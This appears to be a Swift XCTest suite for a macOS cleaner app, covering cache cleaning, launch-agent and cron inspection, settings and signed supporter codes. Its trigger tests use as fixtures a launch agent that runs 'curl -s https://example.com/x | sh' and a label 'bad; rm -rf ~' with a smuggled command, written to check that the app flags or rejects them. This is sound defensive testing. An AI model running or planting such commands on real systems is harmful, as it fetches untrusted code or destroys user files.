import XCTest
#if canImport(CryptoKit)
import CryptoKit
#endif
@testable import KodiakCore

/// A throwaway home folder for each test, so nothing on the Mac running the tests is touched.
class TempHomeTestCase: XCTestCase {
    var home = ""
    var temp = ""
    private var savedHome = ""
    private var savedTemp = ""

    override func setUp() {
        super.setUp()
        savedHome = Paths.home
        savedTemp = Paths.temporary
        let base = FileManager.default.temporaryDirectory.appendingPathComponent("kodiak-test-\(UUID().uuidString)").path
        home = base + "/home"
        temp = base + "/tmp/"
        try? FileManager.default.createDirectory(atPath: home, withIntermediateDirectories: true)
        try? FileManager.default.createDirectory(atPath: temp, withIntermediateDirectories: true)
        Paths.home = home
        Paths.temporary = temp
    }

    override func tearDown() {
        try? FileManager.default.removeItem(atPath: (home as NSString).deletingLastPathComponent)
        Paths.home = savedHome
        Paths.temporary = savedTemp
        super.tearDown()
    }

    func write(_ path: String, _ text: String = "x", age: Double = 0) {
        let full = Paths.expandTilde(path)
        try? FileManager.default.createDirectory(atPath: (full as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        FileManager.default.createFile(atPath: full, contents: Data(text.utf8))
        if age > 0 {
            try? FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-age)], ofItemAtPath: full)
        }
    }
}

final class CleanerTests: TempHomeTestCase {
    func target(_ id: String) -> CleanTarget { Cleaner.catalog().first { $0.id == id }! }

    func testIDsAreUnique() {
        let ids = Cleaner.catalog().map(\.id)
        XCTAssertEqual(ids.count, Set(ids).count)
    }

    func testDefaultOrderFollowsTedsRule() {
        let ordered = Cleaner.ordered(Cleaner.catalog(), selected: [])
        XCTAssertEqual(ordered.first?.group, Cleaner.systemGroup)
        XCTAssertEqual(ordered.last?.group, Cleaner.advancedGroup)
        let middle = ordered.map(\.group).filter { $0 != Cleaner.systemGroup && $0 != Cleaner.advancedGroup }
        var seen: [String] = []
        for group in middle where seen.last != group { seen.append(group) }
        XCTAssertEqual(seen, seen.sorted { $0.lowercased() < $1.lowercased() }, "Programs A to Z")
        for group in Set(ordered.map(\.group)) {
            let names = ordered.filter { $0.group == group }.map { $0.name.lowercased() }
            XCTAssertEqual(names, names.sorted(), "Items A to Z in \(group)")
        }
    }

    func testDefaultPutsTickedFirstInEachGroup() {
        let all = Cleaner.catalog().filter { $0.group == "Google Chrome" }
        let ordered = Cleaner.ordered(all, selected: ["googlechrome.history"])
        XCTAssertEqual(ordered.first?.id, "googlechrome.history")
        XCTAssertEqual(Cleaner.ordered(all, mode: "az").first?.name, "Cache")
    }

    func testAdvancedItemsAreNeverDefault() {
        for item in Cleaner.catalog() where item.advanced { XCTAssertFalse(item.enabledByDefault, item.id) }
    }

    func testFindsAndCleansOnlyWhatItShould() {
        write("~/Library/Caches/Google/Chrome/Default/Cache/Cache_Data/f_000001", String(repeating: "a", count: 1000))
        write("~/Library/Application Support/Google/Chrome/Default/Bookmarks", "keep")
        let chrome = target("googlechrome.cache")
        XCTAssertTrue(Cleaner.isPresent(chrome))
        let finding = Cleaner.find(chrome, running: [])
        XCTAssertEqual(finding.count, 1)
        XCTAssertEqual(finding.size, 1000)
        let results = Cleaner.clean([finding])
        XCTAssertEqual(results[chrome.id]?.freed, 1000)
        XCTAssertFalse(FS.exists(home + "/Library/Caches/Google/Chrome/Default/Cache/Cache_Data/f_000001"))
        XCTAssertTrue(FS.exists(home + "/Library/Caches/Google/Chrome/Default/Cache"), "The folder the pattern names stays")
        XCTAssertFalse(FS.exists(home + "/Library/Caches/Google/Chrome/Default/Cache/Cache_Data"), "Emptied subfolders go")
        XCTAssertTrue(FS.exists(home + "/Library/Application Support/Google/Chrome/Default/Bookmarks"))
    }

    func testOpenProgramIsSkipped() {
        write("~/Library/Caches/Google/Chrome/Default/Cache/x")
        write("~/Library/Application Support/Google/Chrome/Default/Preferences")
        let finding = Cleaner.find(target("googlechrome.cache"), running: ["com.google.chrome"])
        XCTAssertEqual(finding.skipped, "Close Google Chrome first")
        XCTAssertEqual(Cleaner.clean([finding])["googlechrome.cache"]?.freed, 0)
    }

    func testLinksAreRemovedNeverFollowed() throws {
        write("~/Documents/precious.txt", "keep")
        write("~/Library/Logs/DiagnosticReports/old.crash")
        try FileManager.default.createSymbolicLink(atPath: home + "/Library/Logs/DiagnosticReports/link",
                                                   withDestinationPath: home + "/Documents")
        let finding = Cleaner.find(target("macos.crashreports"))
        XCTAssertEqual(Set(finding.files.map { ($0 as NSString).lastPathComponent }), ["old.crash", "link"])
        _ = Cleaner.clean([finding])
        XCTAssertTrue(FS.exists(home + "/Documents/precious.txt"))
        XCTAssertFalse(FS.exists(home + "/Library/Logs/DiagnosticReports/link"))
    }

    func testKeepRecentTemporaryFilesAndExclusions() {
        write(temp + "old.tmp", age: 3 * Cleaner.day)
        write(temp + "new.tmp")
        write(temp + "com.apple.something/old", age: 3 * Cleaner.day)
        let names = Cleaner.find(target("macos.temp"), keepRecent: true).files.map { ($0 as NSString).lastPathComponent }
        XCTAssertEqual(names, ["old.tmp"])
        XCTAssertEqual(Cleaner.find(target("macos.temp"), keepRecent: false).count, 2)
    }

    func testLogsLeaveCrashReportsToTheirOwnItem() {
        write("~/Library/Logs/app.log", age: 3 * Cleaner.day)
        write("~/Library/Logs/DiagnosticReports/a.crash", age: 3 * Cleaner.day)
        XCTAssertEqual(Cleaner.find(target("macos.logs")).files.map { ($0 as NSString).lastPathComponent }, ["app.log"])
    }

    func testNothingOutsideHomeOrTemp() {
        XCTAssertFalse(Cleaner.allowed("/Library/Caches/x"))
        XCTAssertFalse(Cleaner.allowed("/System/x"))
        XCTAssertTrue(Cleaner.allowed(home + "/Library/Caches/x"))
        XCTAssertTrue(Cleaner.allowed(temp + "x"))
        for item in Cleaner.catalog() {
            for pattern in item.patterns { XCTAssertTrue(pattern.hasPrefix("~/") || pattern.hasPrefix("$TMPDIR"), "\(item.id): \(pattern)") }
        }
    }

    func testBrowsersNeverLoseBookmarks() {
        for item in Cleaner.catalog() {
            for pattern in item.patterns {
                XCTAssertFalse(pattern.contains("Bookmarks") || pattern.contains("places.sqlite") || pattern.contains("Bookmarks.plist"),
                               item.id)
            }
        }
    }

    func testMissingProgramsAreHidden() {
        XCTAssertFalse(Cleaner.available().contains { $0.group == "Google Chrome" })
        write("~/Library/Application Support/Google/Chrome/Local State")
        XCTAssertTrue(Cleaner.available().contains { $0.group == "Google Chrome" })
    }
}

final class TriggerTests: TempHomeTestCase {
    func plist(_ dictionary: [String: Any]) -> Data {
        try! PropertyListSerialization.data(fromPropertyList: dictionary, format: .xml, options: 0)
    }

    func testReadsALaunchAgentWithNotes() {
        let path = home + "/Library/LaunchAgents/com.example.updater.plist"
        try? FileManager.default.createDirectory(atPath: home + "/Library/LaunchAgents", withIntermediateDirectories: true)
        FileManager.default.createFile(atPath: path, contents: plist([
            "Label": "com.example.updater",
            "ProgramArguments": ["/bin/sh", "-c", "curl -s https://example.com/x | sh"],
            "RunAtLoad": true, "KeepAlive": true,
        ]))
        let item = Triggers.launchItem(kind: .userAgent, path: path, overrides: [:])!
        XCTAssertEqual(item.label, "com.example.updater")
        XCTAssertEqual(item.enabled, true)
        XCTAssertTrue(item.schedule.contains("At login"))
        let ids = Set(item.notes.map(\.id))
        XCTAssertTrue(ids.contains("download"))
        XCTAssertTrue(ids.contains("recent"))
        XCTAssertTrue(ids.contains("keepalive"))
        XCTAssertTrue(item.needsLook)
        XCTAssertFalse(Triggers.launchItem(kind: .userAgent, path: path, overrides: ["com.example.updater": false])!.enabled!)
    }

    func testMissingProgramAndOddPlaces() {
        let path = home + "/agent.plist"
        FileManager.default.createFile(atPath: path, contents: plist([
            "Label": "x", "Program": home + "/Downloads/.hidden/run",
        ]))
        let ids = Set(Triggers.launchItem(kind: .userAgent, path: path, overrides: [:])!.notes.map(\.id))
        XCTAssertEqual(ids.intersection(["missing", "oddplace"]), ["missing", "oddplace"])
    }

    func testAppNameFromProgramPath() {
        XCTAssertEqual(Triggers.appName("/Applications/Foo Bar.app/Contents/MacOS/helper"), "Foo Bar")
        XCTAssertNil(Triggers.appName("/usr/local/bin/thing"))
    }

    func testParsesLaunchctlOverrides() {
        let text = """
        disabled services = {
        \t"com.apple.foo" => disabled
        \t"com.example.bar" => enabled
        \t"com.example.old" => true
        }
        """
        XCTAssertEqual(Triggers.parseOverrides(text), ["com.apple.foo": false, "com.example.bar": true, "com.example.old": false])
    }

    func testCronLines() {
        let jobs = Triggers.cronJobs("PATH=/usr/bin\n# a comment\n*/5 * * * * /usr/local/bin/backup --now\n#kodiak-off# @reboot /tmp/x.sh\n")
        XCTAssertEqual(jobs.count, 2)
        XCTAssertEqual(jobs[0].name, "backup")
        XCTAssertEqual(jobs[0].schedule, "*/5 * * * *")
        XCTAssertEqual(jobs[1].enabled, false)
        XCTAssertEqual(jobs[1].schedule, "At startup")
        XCTAssertTrue(jobs[1].notes.contains { $0.id == "oddplace" })
    }

    func testProtectedAndSystemRules() {
        let apple = Trigger(id: "a", kind: .appleDaemon, label: "com.apple.x", name: "x", path: "/System/x.plist", enabled: true)
        XCTAssertTrue(apple.isProtected)
        XCTAssertFalse(apple.canToggle && !apple.isProtected)
        XCTAssertEqual(Triggers.change([apple], to: .turnedOff)["a"], "Kodiak Cleaner doesn't change this one")
        let daemon = Trigger(id: "d", kind: .daemon, label: "com.example.d", name: "d", path: "/Library/LaunchDaemons/com.example.d.plist", enabled: true)
        XCTAssertTrue(daemon.needsAdmin)
        XCTAssertFalse(daemon.canRemove)
    }

    func testRejectsUnsafeLabels() {
        let item = Trigger(id: "u", kind: .userAgent, label: "bad; rm -rf ~", name: "bad", path: home + "/x.plist", enabled: true)
        XCTAssertNotNil(Triggers.change([item], to: .turnedOff)["u"])
        XCTAssertTrue(Triggers.history().isEmpty)
    }

    func testRemoveBacksUpAndRestorePutsItBack() {
        Triggers.launchctl = "/usr/bin/true"
        defer { Triggers.launchctl = "/bin/launchctl" }
        let folder = home + "/Library/LaunchAgents"
        try? FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        let path = folder + "/com.example.agent.plist"
        FileManager.default.createFile(atPath: path, contents: plist(["Label": "com.example.agent", "Program": "/usr/bin/true"]))
        let item = Triggers.launchItem(kind: .userAgent, path: path, overrides: [:])!
        XCTAssertEqual(Triggers.change([item], to: .removed), [:])
        XCTAssertFalse(FS.exists(path))
        let entry = Triggers.history().first!
        XCTAssertEqual(entry.action, .removed)
        XCTAssertTrue(FS.exists(entry.backup))
        XCTAssertNil(Triggers.restore(entry))
        XCTAssertTrue(FS.exists(path))
        XCTAssertTrue(Triggers.history().first!.restored)
    }

    func testTurningOffRecordsHistory() {
        var commands: [[String]] = []
        Triggers.launchctl = "/usr/bin/true"
        defer { Triggers.launchctl = "/bin/launchctl" }
        let path = home + "/com.example.t.plist"
        FileManager.default.createFile(atPath: path, contents: plist(["Label": "com.example.t", "Program": "/usr/bin/true"]))
        let item = Triggers.launchItem(kind: .userAgent, path: path, overrides: [:])!
        XCTAssertEqual(Triggers.change([item], to: .turnedOff), [:])
        XCTAssertEqual(Triggers.history().first?.action, .turnedOff)
        // Daemons go through one administrator prompt with fixed commands only.
        let saved = Triggers.runAsAdmin
        Triggers.runAsAdmin = { list in commands.append(list); return (true, "") }
        defer { Triggers.runAsAdmin = saved }
        let daemonPath = "/Library/LaunchDaemons/com.example.d.plist"
        let daemon = Trigger(id: daemonPath, kind: .daemon, label: "com.example.d", name: "d", path: daemonPath, enabled: true)
        // The backup needs the real file; without it nothing is changed.
        if !FS.exists(daemonPath) {
            XCTAssertNotNil(Triggers.change([daemon], to: .turnedOff)[daemonPath])
            XCTAssertTrue(commands.isEmpty)
        }
    }
}

final class SettingsAndTextTests: TempHomeTestCase {
    func testSettingsSurviveDamageAndKeepDefaults() {
        let path = home + "/s.json"
        FileManager.default.createFile(atPath: path, contents: Data(#"{"scheme": "plaid", "animations": "yes", "accent": "Teal"}"#.utf8))
        let settings = AppSettings.load(from: path)
        XCTAssertEqual(settings.scheme, "honey")
        XCTAssertTrue(settings.animations)
        XCTAssertEqual(settings.accent, "Teal")
        var changed = settings
        changed.mode = "dark"
        changed.save(to: path)
        XCTAssertEqual(AppSettings.load(from: path).mode, "dark")
        XCTAssertEqual(AppSettings.load(from: home + "/missing.json"), AppSettings())
    }

    func testResetKeepsCodeAndHistory() {
        var settings = AppSettings()
        settings.supporterCode = "abc"
        settings.scheme = "glacier"
        settings.cleanerHistory = ["x": Cleaner.History(lastCleaned: 1, freed: 2)]
        let reset = settings.reset()
        XCTAssertEqual(reset.supporterCode, "abc")
        XCTAssertEqual(reset.scheme, "honey")
        XCTAssertEqual(reset.cleanerHistory.count, 1)
    }

    func testChangelogParsing() {
        let text = "# Changelog\n\n## [0.8.1 Dev] - 2026-10-07\n\n- New\n\n## [0.8.0 Dev] - 2026-10-06\n\n- First\n"
        let releases = Changelog.parse(text)
        XCTAssertEqual(releases.map(\.heading), ["0.8.1 Dev", "0.8.0 Dev"])
        XCTAssertEqual(releases[0].date, "2026-10-07")
        XCTAssertEqual(releases[0].text, "- New")
        XCTAssertEqual(Changelog.newer(than: "0.8.0", in: releases).map(\.version), ["0.8.1"])
    }

    func testBundledChangelogHasThisVersion() {
        XCTAssertEqual(Changelog.parse().first?.version, AppInfo.version)
    }

    func testVersionNames() {
        XCTAssertEqual(AppInfo.versionName("0.8.0", channel: "dev"), "0.8.0 Dev")
        XCTAssertEqual(AppInfo.versionName("1.0.2", channel: "stable"), "1.0.2")
        XCTAssertTrue(AppInfo.isNewer("0.8.10", than: "0.8.9"))
        XCTAssertFalse(AppInfo.isNewer("0.8.0", than: "0.8.0"))
    }

    func testFeedbackLinkHasNoHiddenData() {
        let url = Feedback.link(kind: "idea", subject: "Hi & bye", body: "A=1\nB")!.absoluteString
        XCTAssertTrue(url.hasPrefix("mailto:www.kodiakcleaner.app/contact?subject=Hi%20%26%20bye&body=A%3D1%0AB"))
        XCTAssertFalse(Feedback.defaultBody("feedback").contains("Details"))
        XCTAssertTrue(Feedback.defaultBody("bug").contains("Details for Your Report"))
        XCTAssertFalse(Feedback.details().contains(NSUserName()))
    }
}

#if canImport(CryptoKit)
final class SupporterTests: XCTestCase {
    let key = P256.Signing.PrivateKey()

    func code(_ payload: [String: String]) -> String {
        let data = try! JSONSerialization.data(withJSONObject: payload)
        let signature = try! key.signature(for: data).rawRepresentation
        func b64(_ d: Data) -> String {
            d.base64EncodedString().replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_")
                .replacingOccurrences(of: "=", with: "")
        }
        return b64(data) + "." + b64(signature)
    }

    func testValidCodes() {
        let pem = key.publicKey.pemRepresentation
        let (status, license) = Supporter.verify(code(["id": "abc", "name": "Jane", "issued": "2026-10-06"]), publicKey: pem, withdrawn: [])
        XCTAssertEqual(status, .valid)
        XCTAssertEqual(license?.name, "Jane")
        let c = code(["id": "abc"])
        let spaced = "  " + String(c.prefix(10)) + "\n" + String(c.dropFirst(10)) + " "
        XCTAssertEqual(Supporter.verify(spaced, publicKey: pem, withdrawn: []).0, .valid)
    }

    func testBadCodes() {
        let pem = key.publicKey.pemRepresentation
        let good = code(["id": "abc"])
        let otherPayload = String(code(["id": "xyz"]).split(separator: ".")[0])
        let tampered = otherPayload + "." + String(good.split(separator: ".")[1])
        XCTAssertEqual(Supporter.verify(tampered, publicKey: pem, withdrawn: []).0, .badSignature)
        XCTAssertEqual(Supporter.verify("", publicKey: pem).0, .empty)
        XCTAssertEqual(Supporter.verify("nodot", publicKey: pem).0, .malformed)
        XCTAssertEqual(Supporter.verify(good, publicKey: pem, withdrawn: ["abc"]).0, .withdrawn)
    }

    func testTestKeyIsBundledAndLocksThemes() {
        XCTAssertTrue(Supporter.publicKey.pem.hasPrefix("-----BEGIN PUBLIC KEY-----"))
        var settings = AppSettings()
        settings.scheme = "glacier"
        XCTAssertEqual(Supporter.Plan(settings: settings).scheme("glacier"), "honey")
        XCTAssertEqual(Supporter.Plan(settings: settings).scheme("honey"), "honey")
    }
}
#endif
